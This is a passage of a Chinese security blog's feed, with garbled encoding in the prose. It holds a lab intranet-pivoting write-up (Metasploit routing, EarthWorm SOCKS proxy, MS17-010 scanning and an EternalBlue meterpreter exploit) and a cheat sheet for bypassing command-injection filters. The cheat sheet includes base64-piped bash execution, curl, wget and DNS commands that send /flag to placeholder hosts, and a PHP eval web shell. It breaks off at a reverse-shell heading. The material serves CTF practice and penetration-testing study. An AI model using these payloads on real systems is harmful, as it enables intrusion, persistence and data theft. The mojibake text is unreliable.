&lt;figure class=&#34;highlight stata&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stata&#34;&gt;background&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;post&lt;/span&gt;/multi/manage/autoroute&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; session x&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ä»£ç†è½¬å‘&#34;&gt;&lt;a href=&#34;#ä»£ç†è½¬å‘&#34; class=&#34;headerlink&#34; title=&#34;ä»£ç†è½¬å‘&#34;&gt;&lt;/a&gt;ä»£ç†è½¬å‘&lt;/h3&gt;&lt;h4 id=&#34;ä½¿ç”¨ewä»£ç†è½¬å‘&#34;&gt;&lt;a href=&#34;#ä½¿ç”¨ewä»£ç†è½¬å‘&#34; class=&#34;headerlink&#34; title=&#34;ä½¿ç”¨ewä»£ç†è½¬å‘&#34;&gt;&lt;/a&gt;ä½¿ç”¨ewä»£ç†è½¬å‘&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;ä¸Šä¼ ew_for_linux64&lt;/li&gt;
&lt;li&gt;æ‰§è¡Œ&lt;code&gt;./ew -s ssocksd -l 8888&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æ›´æ”¹kaliçš„/etc/proxychains4.confæ–‡ä»¶ï¼Œæ·»åŠ socks5 ip prot&lt;/li&gt;
&lt;li&gt;åœ¨éœ€è¦ä»£ç†æ—¶ï¼Œæ‰§è¡Œå‘½ä»¤å¦‚&lt;code&gt;proxychains4 curl http://127.0.0.1:2003/&lt;/code&gt;å³å¯&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;Ubuntuä¿¡æ¯æ”¶é›†&#34;&gt;&lt;a href=&#34;#Ubuntuä¿¡æ¯æ”¶é›†&#34; class=&#34;headerlink&#34; title=&#34;Ubuntuä¿¡æ¯æ”¶é›†&#34;&gt;&lt;/a&gt;Ubuntuä¿¡æ¯æ”¶é›†&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;ä»è·¯ç”±è¡¨å¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªç½‘æ®µï¼Œæœ‰ä¸ª183ç½‘æ®µåº”è¯¥å°±æ˜¯å†…ç½‘ç½‘æ®µäº†&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;msfè¿›è¡Œä¸€æ³¢å­˜æ´»æ‰«æ&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;use&lt;/span&gt; auxiliary/scanner/discovery/udp_probeset rhosts &lt;span class=&#34;hljs-number&#34;&gt;192.168.183.0&lt;/span&gt;-&lt;span class=&#34;hljs-number&#34;&gt;255&lt;/span&gt;set threads &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æœ‰128ã€130ä¸¤å°æœºå­ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ‰«ä¸€ä¸‹ms17-010&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;use&lt;/span&gt; auxiliary/scanner/smb/smb_ms&lt;span class=&#34;hljs-number&#34;&gt;17&lt;/span&gt;_&lt;span class=&#34;hljs-number&#34;&gt;010&lt;/span&gt;set rhosts &lt;span class=&#34;hljs-number&#34;&gt;192.168.183.128&lt;/span&gt;-&lt;span class=&#34;hljs-number&#34;&gt;130&lt;/span&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°128çš„win7å’Œ130çš„winserver2008éƒ½å¯èƒ½å­˜åœ¨æ°¸æ’ä¹‹è“ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å°è¯•æ‰“æ°¸æ’ä¹‹è“ï¼Œæµ‹è¯•å‘ç°128çš„win7èƒ½æ‰“é€šï¼Œ130çš„winserver2008æ‰“ä¸é€šã€‚&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;setg Proxies socks5:&lt;span class=&#34;hljs-number&#34;&gt;10.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;5.100&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;8888&lt;/span&gt;					&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;MSFèµ°ewçš„ä»£ç†set ReverseAllowProxy true							&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;å¼€å¯åå‘ä»£ç†use exploit&lt;span class=&#34;hljs-regexp&#34;&gt;/windows/&lt;/span&gt;smb&lt;span class=&#34;hljs-regexp&#34;&gt;/ms17_010_eternalblueset payload windows/&lt;/span&gt;x64&lt;span class=&#34;hljs-regexp&#34;&gt;/meterpreter/&lt;/span&gt;bind_tcpset rhost &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;183.128&lt;/span&gt;set lport &lt;span class=&#34;hljs-number&#34;&gt;4444&lt;/span&gt;set AutoRunScript post&lt;span class=&#34;hljs-regexp&#34;&gt;/windows/m&lt;/span&gt;anage&lt;span class=&#34;hljs-regexp&#34;&gt;/migrate       /&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/è‡ªåŠ¨è¿ç§»è¿›ç¨‹run&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;æˆåŠŸæ‹¿ä¸‹shell&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;Win7æƒé™ç»´æŒ&#34;&gt;&lt;a href=&#34;#Win7æƒé™ç»´æŒ&#34; class=&#34;headerlink&#34; title=&#34;Win7æƒé™ç»´æŒ&#34;&gt;&lt;/a&gt;Win7æƒé™ç»´æŒ&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;è™½ç„¶æ‹¿åˆ°äº†shellï¼Œä½†æ˜¯åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­å‘ç°è¿™ä¸ªshellç»å¸¸æ‰çº¿ï¼Œåªèƒ½æƒ³åŠæ³•å¼„ä¸ªç¨³å®šç‚¹çš„shell&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;Win7ä¿¡æ¯æ”¶é›†&#34;&gt;&lt;a href=&#34;#Win7ä¿¡æ¯æ”¶é›†&#34; class=&#34;headerlink&#34; title=&#34;Win7ä¿¡æ¯æ”¶é›†&#34;&gt;&lt;/a&gt;Win7ä¿¡æ¯æ”¶é›†&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;code&gt;route print&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737582.png&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;code&gt;net user /domain&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;code&gt;net user&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;&lt;code&gt;net view&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;&lt;code&gt;ping WIN-ENS2VR5TR3N&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071744532.png&#34;&gt;&lt;/p&gt;
</content>
        <updated>2021-09-20T15:49:36.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2020/07/09/%E5%AD%98%E5%9C%A8%E9%99%90%E5%88%B6%E7%9A%84shell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
        <title>å­˜åœ¨é™åˆ¶çš„shellå‘½ä»¤æ‰§è¡Œ</title>
        <link rel="alternate" href="http://blog.m1n.me/2020/07/09/%E5%AD%98%E5%9C%A8%E9%99%90%E5%88%B6%E7%9A%84shell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
        <content type="html">&lt;h1 id=&#34;æˆªæ–­ç¬¦-amp-amp&#34;&gt;&lt;a href=&#34;#æˆªæ–­ç¬¦-amp-amp&#34; class=&#34;headerlink&#34; title=&#34;æˆªæ–­ç¬¦;,|,||,&amp;amp;&amp;amp;&#34;&gt;&lt;/a&gt;æˆªæ–­ç¬¦&lt;code&gt;;&lt;/code&gt;,&lt;code&gt;|&lt;/code&gt;,&lt;code&gt;||&lt;/code&gt;,&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;code&gt;|&lt;/code&gt;è¡¨ç¤ºç®¡é“ï¼Œä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤å‚æ•°(è¾“å…¥)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;||&lt;/code&gt; è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åï¼Œæ‰æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;è¡¨ç¤ºå‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œæ‰æ‰§è¡Œåä¸€æ¡å‘½ä»¤&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;è¡¨ç¤ºä»»åŠ¡åœ¨åå°æ‰§è¡Œ,å¦‚&lt;code&gt;java -jar test.jar &amp;gt; log.txt &amp;amp;&lt;/code&gt;ï¼ŒåŒæ—¶ï¼Œæ”¾åœ¨ä¸¤ä¸ªå‘½ä»¤ä¹‹é—´æ—¶ä¸¤ä¸ªéƒ½ä¼šæ‰§è¡Œï¼Œç¬¬ä¸€ä¸ªå‘½ä»¤åå°æ‰§è¡Œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%0a&lt;/code&gt;æ¢è¡Œç¬¦&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%0d&lt;/code&gt;å›è½¦ç¬¦&lt;/li&gt;
&lt;li&gt;&lt;code&gt;;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;shellå­˜åœ¨éƒ¨åˆ†è¿‡æ»¤&#34;&gt;&lt;a href=&#34;#shellå­˜åœ¨éƒ¨åˆ†è¿‡æ»¤&#34; class=&#34;headerlink&#34; title=&#34;shellå­˜åœ¨éƒ¨åˆ†è¿‡æ»¤&#34;&gt;&lt;/a&gt;shellå­˜åœ¨éƒ¨åˆ†è¿‡æ»¤&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;è¿‡æ»¤äº†ç©ºæ ¼&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$IFS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;IFS&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$IFS&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$1&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$1&lt;/span&gt;æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ&lt;br&gt;&amp;lt; &lt;br&gt;&amp;lt;&amp;gt; &lt;br&gt;&amp;#123;cat,flag.php&amp;#125;  &lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½&lt;br&gt;%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;&lt;br&gt;%&lt;span class=&#34;hljs-number&#34;&gt;09&lt;/span&gt;&lt;br&gt;kg=$&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\x20/flag&amp;#x27;&lt;/span&gt;&amp;amp;&amp;amp;cat&lt;span class=&#34;hljs-variable&#34;&gt;$kg&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;\x20å˜æˆäº†ç©ºæ ¼&lt;br&gt;\tå’Œ\rå’Œ\nä»£æ›¿ç©ºæ ¼&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;è¿‡æ»¤äº†éƒ¨åˆ†å…³é”®è¯&lt;/p&gt;
&lt;figure class=&#34;highlight taggerscript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs taggerscript&#34;&gt;æ‹¼æ¥å®ç°ç»•è¿‡ï¼ša=l;b=s;&lt;span class=&#34;hljs-keyword&#34;&gt;$a$b&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;å¼•å·ã€åæ–œæ ç»•è¿‡ï¼šca&amp;#x27;&amp;#x27;t    ca&amp;quot;&amp;quot;t  ca\t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;ç‰¹æ®Šå˜é‡ç»•è¿‡ï¼šca#@t  ca#*t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;ç¼–ç ç»•è¿‡ï¼šecho Y2F0IC9mbGFn|base64 -d|bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;		echo &amp;quot;636174202f666c6167&amp;quot; | xxd -r -p|bashï¼ˆhexç¼–ç ï¼‰&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;		$&lt;/span&gt;(printf &amp;quot;&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;63&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;61&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;74&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;20&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;2f&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;66&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;6c&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;61&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;67&amp;quot;)&lt;br&gt;		&amp;#123;printf,&amp;quot;&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;63&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;61&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;74&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;20&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;2f&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;66&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;6c&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;61&lt;span class=&#34;hljs-symbol&#34;&gt;\x&lt;/span&gt;67&amp;quot;&amp;#125;|bash&lt;br&gt;		å½“bashä¹Ÿè¢«ç¦æ—¶ï¼Œå¯ä»¥è¯•è¯•sh&lt;br&gt;é€šé…ç¬¦ç»•è¿‡ï¼šfl*   fla?   fla[0-z]  fla[123hg]  fla&amp;#123;1,2,3,g&amp;#125; &lt;br&gt;		ä¸€äº›å¸¸ç”¨çš„é€šé…ç¬¦ï¼š&lt;br&gt;			* åŒ¹é…ä»»æ„ä¸ªæ•°çš„å­—ç¬¦&lt;br&gt;			? åŒ¹é…ä¸€ä¸ªå­—ç¬¦&lt;br&gt;			[list] åŒ¹é…æŒ‡å®šèŒƒå›´å†…(list)ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ&lt;br&gt;			[^list] åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ&lt;br&gt;			[!list] å’Œ[^list]ä¸€æ ·&lt;br&gt;			&amp;#123;1,2,&amp;#125; é€ä¸€åŒ¹é…&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;è¿‡æ»¤&lt;code&gt;/&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs powershell&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cat&lt;/span&gt; `expr substr &lt;span class=&#34;hljs-variable&#34;&gt;$&lt;/span&gt;(&lt;span class=&#34;hljs-built_in&#34;&gt;pwd&lt;/span&gt;) &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;`flag&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;æ— å›æ˜¾&#34;&gt;&lt;a href=&#34;#æ— å›æ˜¾&#34; class=&#34;headerlink&#34; title=&#34;æ— å›æ˜¾&#34;&gt;&lt;/a&gt;æ— å›æ˜¾&lt;/h1&gt;&lt;p&gt;æ–‡ç« ï¼šâ€™&lt;a href=&#34;https://250.ac.cn/2018/12/18/%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E5%88%A9%E7%94%A8/&#34;&gt;https://250.ac.cn/2018/12/18/%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E5%88%A9%E7%94%A8/&lt;/a&gt;â€˜&lt;/p&gt;
&lt;h3 id=&#34;æœåŠ¡å™¨å¯ä»¥è®¿é—®å¤–ç½‘&#34;&gt;&lt;a href=&#34;#æœåŠ¡å™¨å¯ä»¥è®¿é—®å¤–ç½‘&#34; class=&#34;headerlink&#34; title=&#34;æœåŠ¡å™¨å¯ä»¥è®¿é—®å¤–ç½‘&#34;&gt;&lt;/a&gt;æœåŠ¡å™¨å¯ä»¥è®¿é—®å¤–ç½‘&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;curl ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;curl http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;**.**.**.**&lt;span class=&#34;hljs-regexp&#34;&gt;/index.php?jingzhe=`cat /&lt;/span&gt;flag`&lt;br&gt;curl -d `cat &lt;span class=&#34;hljs-regexp&#34;&gt;/flag|base64` http:/&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/example.com&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;wget:&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;wget http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;**.**.**.**&lt;span class=&#34;hljs-regexp&#34;&gt;/index.php?jingzhe=`cat /&lt;/span&gt;flag`&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;DNSlog:&lt;/p&gt;
&lt;figure class=&#34;highlight autohotkey&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs autohotkey&#34;&gt;ping `cat /flag`.aaaaaa.ceye.io&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å†™shellï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php-template&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php-template&#34;&gt;&lt;span class=&#34;xml&#34;&gt;echo &amp;#x27;&lt;/span&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; @&lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag&amp;quot;&lt;/span&gt;]); &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;xml&#34;&gt;&amp;#x27; &amp;gt; aaa.php&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;åå¼¹shell&lt;/p&gt;
